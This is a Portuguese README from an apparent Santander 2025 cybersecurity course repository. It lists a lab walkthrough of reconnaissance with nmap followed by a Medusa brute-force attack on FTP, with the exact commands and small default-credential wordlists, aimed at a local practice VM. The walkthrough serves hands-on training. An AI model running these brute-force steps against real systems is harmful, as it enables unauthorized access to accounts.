# CiberSeguranca-Santander-2025
Este repositório reúne materiais, projetos e soluções desenvolvidos para o programa de Cibersegurança do Santander em 2025. O foco é fortalecer a proteção digital da instituição por meio de práticas avançadas de segurança da informação, análise de vulnerabilidades, resposta a incidentes e conformidade com normas internacionais.

---

📘 [Preparando o ambiente controlado](1.ambiente.md)

--- 
1° - Rastreamento de IP: ifconfig [máquina alvo]
      Retorno: 192.168.56.101
      
2° - Teste de conexão: ping -c 3 192.168.56.101
      
3° - Varredura da rede: nmap -sV -p 21,22,80,445,139 192.168.56.101

4° - Teste de conexão ftp: ftp 192.168.56.101

5° - Preparo para ataque com a Medusa
    - Criação da wordlist de usuarios: echo -e 'user\nmsfadmin\nadmin\nroot' > users.txt
    - Criação da wordlist de senhas: echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt

6° - Ataque: medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6

7° - Testa a conexão: ftp 192.168.56.101
